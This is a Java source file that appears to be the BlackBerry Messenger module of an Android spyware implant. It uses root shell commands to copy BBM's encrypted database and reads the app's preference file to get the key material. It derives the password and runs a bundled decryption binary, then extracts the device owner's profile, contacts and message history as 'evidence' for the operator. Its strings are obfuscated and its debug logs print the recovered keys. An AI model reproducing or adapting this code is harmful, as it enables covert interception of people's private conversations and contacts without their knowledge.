package com.android.dvci.module.chat;

import android.database.Cursor;
import android.util.Base64;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.XmlParser;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordGroupsVisitor;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.AutoFile;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.Format;
import java.util.ArrayList;
import java.util.Date;
import java.util.Formatter;
import java.util.concurrent.Semaphore;
import java.util.jar.Attributes;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

/**
 * Created by zeno on 30/10/14.
 */
public class ChatBBM extends SubModuleChat {


	private static final int BBM_v1 = 1;
	private static final int BBM_v2 = 0;
	private int version = BBM_v1;

	public class Account {

		public int id;
		public String displayName;
		public String pin;

		public String getName() {
			return (pin + " " + displayName).trim().toLowerCase();
		}
	}

	private static final String TAG = "ChatBBM";
	private static final int PROGRAM = 0x05; // anche per addressbook

	String pObserving = M.e("com.bbm");
	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
	String dbFileMasterEnc = M.e("/data/data/com.bbm/files/bbmcore/master.enc");
	String bbmPref = M.e("/data/data/com.bbm/shared_prefs/com.blackberry.bbm.PREFERENCES.xml");

	private long lastBBM;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Account account;

	//private GenericSqliteHelper helper;

	private boolean firstTime = true;

	private boolean started;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyStopProgram) ");
		}
		updateHistory();
	}

	private void updateHistory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateHistory) ");
		}

		if (!started || !readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory), semaphore red");
			}
			return;
		}
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);

		try {
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateHistory) cannot open db");
				}
			}
			if (helper == null) {
				helper = openBBMChatEnc(dbFileMasterEnc);
			}


			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}

			if (Cfg.DEBUG) {
				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
			}

			readBBMChatHistory(helper);


		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory) Error: " + e);
			}
		} finally {
			if (helper != null) {
				helper.disposeDb();
			}
			readChatSemaphore.release();
		}
	}

	private GenericSqliteHelper openBBMChatEnc(String dbFileMasterEnc) {
		String password = calculateBBMChatPassword();

		String pack = Status.self().getAppContext().getPackageName();
		final String installPath = String.format(M.e("/data/data/%s/files"), pack);

		final AutoFile bbconvert = new AutoFile(installPath, M.e("bb")); // selinux_suidext
		final AutoFile dbplain = new AutoFile(installPath, M.e("p.db"));
		final AutoFile dbenc = new AutoFile(installPath, M.e("e.db"));
		dbplain.delete();
		dbenc.delete();

		if(! Utils.dumpAsset(M.e("bb.data"), bbconvert.getName())){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openBBMChatEnc), Error, cannot find resource");
			}
			return null;
		}

		Execute.execute(M.e("/system/bin/chmod 755 ") + bbconvert.getFilename());

		String command = String.format(M.e("cat %s > %s"), dbFileMasterEnc, dbenc);
		ExecuteResult res = Execute.executeRoot(command);

		Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (openBBMChatEnc) execute: " + command + " ret: " + res.exitCode);
		}

		if(!dbenc.exists()){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc");
			}
			return null;
		}

		command = String.format("%s %s %s %s", bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
		res = Execute.execute(command);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (openBBMChatEnc) execute: " + bbconvert + " ret: " + res.exitCode);
		}

		bbconvert.delete();
		dbenc.delete();

		GenericSqliteHelper helper = null;
		if(dbplain.exists()){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openBBMChatEnc), dbplain size: " + dbplain.getSize());
			}
			helper = GenericSqliteHelper.openAsCopy(dbplain.getFilename());

		}
		return helper;
	}

	private String calculateBBMChatPassword() {
		ChatBBM_Crypto crypto = new ChatBBM_Crypto();
		String sql_key = null;
		String app_guid = null;
		ExecuteResult res = Execute.executeRoot("cat " + bbmPref);

		String xml = res.getStdout();
		try {
			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(StringUtils.stringToInputStream(xml));

			NodeList nodes = doc.getElementsByTagName("string");
			for (int i = 0; i < nodes.getLength(); i++) {
				Element n = (Element) nodes.item(i);

				if("sql_key".equals(n.getAttribute("name"))){
					sql_key = n.getFirstChild().getNodeValue();
				}

				if("app_guid".equals(n.getAttribute("name"))){
					app_guid = n.getFirstChild().getNodeValue();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (openBBMChatEnc), sql_key: %s", sql_key);
				Check.log(TAG + " (openBBMChatEnc), app_guid: %s", app_guid);
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openBBMChatEnc), ERROR", e);
			}
		}

		String ret = null;
		try {
			ret = crypto.decrypt(sql_key, app_guid);
		} catch (Exception e) {
			e.printStackTrace();
		}
		byte[] data = null;
		try {
			data = ret.getBytes("UTF-8");
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}

		String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (openBBMChatEnc), db: %s", b64);
		}

		return b64;
	}


	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start) ");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), semaphore red");
			}
			return;
		}

		try {

			lastBBM = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
			if (helper == null) {
				helper =  openBBMChatEnc(dbFileMasterEnc);
			}
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) cannot open db");
				}

				return;
			}

			try {
				version = getBBMVersion(helper);
				readLocalContact(helper);
				readAddressContacts(helper);

				readBBMChatHistory(helper);

			} finally {
				helper.disposeDb();

			}
			started = true;

		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private int getBBMVersion(GenericSqliteHelper helper) {

		final int[] type = {0};
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				type[0] = cursor.getInt(0);
				return 0;
			}
		};

		helper.traverseRawQuery(M.e("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'"), null, visitor);
		return type[0];
	}

	private long readBBMChatHistory(GenericSqliteHelper helper) {
		long lastmessageS = readBBMConversationHistory(helper);
		long lastmessageG = readBBMGroupHistory();

		long lastmessage = Math.max(lastmessageS, lastmessageG);

		if (lastmessage > lastBBM) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) serialize: %d", lastmessage);
			}
			markup.serialize(lastmessage);
			lastBBM = lastmessage;
		}

		return lastmessage;
	}

	private long readBBMGroupHistory() {
		//
		return 0;
	}

	private long readBBMConversationHistory(GenericSqliteHelper helper) {

		String timestamp = Long.toString(this.lastBBM / 1000);
		final ChatGroups groups = new ChatGroups();
		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
		String[] sql = new String[]{ M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID WHERE C.MESSAGETIMESTAMP > ?"),
				M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID JOIN USERPINS AS S ON U.USERID = S.USERID WHERE C.MESSAGETIMESTAMP > ?")	};

		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		if(groups.getAllGroups().size()==0){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMConversationHistory), No groups ");
			}
			return 0;
		}

		Contact me = groups.getContact("0");
		if(me == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMConversationHistory), ERROR: cannot get contact 0");
			}

			return 0;
		}
		final String me_number =me.number;
		final String me_name = me.name;

		RecordVisitor visitorMsg = new RecordVisitor(null, null, M.e("T.TIMESTAMP")) {
			@Override
			public long cursor(Cursor cursor) {
				String groupid = cursor.getString(0);
				Long timestamp = cursor.getLong(1) * 1000;
				Date date = new Date(timestamp);
				String content = cursor.getString(2);
				String userId = cursor.getString(3);

				boolean incoming = !userId.equals("0");
				Contact contact = groups.getContact(userId);

				String peer_id = contact.number;
				String peer = contact.name;

				String from_id, from, to_id, to;
				if(incoming){
					from_id = peer_id;
					from = peer;
					to_id = groups.getGroupToName(from_id, groupid);
					to = groups.getGroupToDisplayName(from_id, groupid);
				}else{
					from_id = me_number;
					from = me_name;
					to_id = groups.getGroupToName(from_id, groupid);
					to = groups.getGroupToDisplayName(from_id, groupid);
				}

				MessageChat message = new MessageChat(PROGRAM, date, from_id, from, to_id, to, content, incoming);
				messages.add(message);
				return timestamp;
			}
		};

		String sqlmsg = M.e("SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID FROM TEXTMESSAGES AS T JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID JOIN USERS AS U ON U.USERID = P.USERID WHERE T.TIMESTAMP>? AND C.CONVERSATIONID=?");

		long maxid = 0;
		for( String group: groups.getAllGroups() ){
			long ret = helper.traverseRawQuery(sqlmsg, new String[]{timestamp, group}, visitorMsg);
			maxid=Math.max(ret, maxid);
		}

		getModule().saveEvidence(messages);

		return maxid;
	}

	private void readAddressContacts(GenericSqliteHelper helper) {

		if (ModuleAddressBook.getInstance() != null) {
			try {
				if (version == BBM_v1) {
					readAddressContactsUserPins(helper);
				} else {
					readAddressContactsUsers(helper);
				}
			} catch (SAXException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (ParserConfigurationException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			}
		}
	}

	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		String sql = M.e("SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId");
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};

		helper.traverseRawQuery(sql, null, visitor);
	}

	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		RecordVisitor visitor = new RecordVisitor(StringUtils.split(M.e("userid,pin,displayname")), null) {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor), contact: " + contact);
				}
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};

		helper.traverseRecords(M.e("Users"), visitor);
	}

	private void readLocalContact(GenericSqliteHelper helper) {

		String sql = M.e("SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId");
		account = new Account();

		RecordVisitor visitor = new RecordVisitor(null, null) {

			@Override
			public long cursor(Cursor cursor) {
				account.id = cursor.getInt(0);
				account.pin = cursor.getString(1);
				account.displayName = cursor.getString(2);
				return 0;
			}
		};
		helper.traverseRawQuery(sql, null, visitor);

		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.BBM, account.getName());
	}
}
